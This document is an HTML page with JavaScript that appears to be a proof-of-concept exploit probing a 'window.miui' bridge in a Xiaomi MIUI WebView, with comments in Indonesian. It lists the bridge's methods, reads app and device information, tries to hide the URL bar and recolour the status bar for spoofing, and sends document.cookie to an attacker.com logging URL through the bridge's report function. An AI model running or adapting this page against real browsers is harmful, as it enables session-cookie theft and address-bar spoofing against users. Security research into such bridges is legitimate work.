<!doctype html>
<meta charset="utf-8">
<body style="white-space:pre; font-family:monospace"></body>
<script>
(function(){
  function log(msg){
    document.body.textContent += msg + "\n";
    console.log(msg);
  }

  try {
    if (typeof window.miui === "object") {
      log("[+] miui object detected");

      // coba dump semua key
      for (let k in window.miui){
        log(" - " + k + " : " + typeof window.miui[k]);
      }

      // coba panggil beberapa
      try { log("getLanguage() => " + window.miui.getLanguage()); } catch(e){ log("getLanguage() failed " + e); }
      try { log("getRegion() => " + window.miui.getRegion()); } catch(e){ log("getRegion() failed " + e); }
      try { log("getAppId() => " + window.miui.getAppId()); } catch(e){ log("getAppId() failed " + e); }
      try { log("getApplicationInfo() => " + JSON.stringify(window.miui.getApplicationInfo())); } catch(e){ log("getApplicationInfo() failed " + e); }

      // coba trigger UI trick
      try { window.miui.setStatusBarColor("#00FF00"); log("Status bar color changed"); } catch(e){}
      try { window.miui.showUrlBar(false); log("URL bar hidden"); } catch(e){}
      try { window.miui.report("https://attacker.com/log?cookie=" + encodeURIComponent(document.cookie)); log("Report exfil sent"); } catch(e){}

    } else {
      log("[-] miui not found, typeof=" + typeof window.miui);
    }
  } catch(err){
    log("err: " + err);
  }
})();
</script>
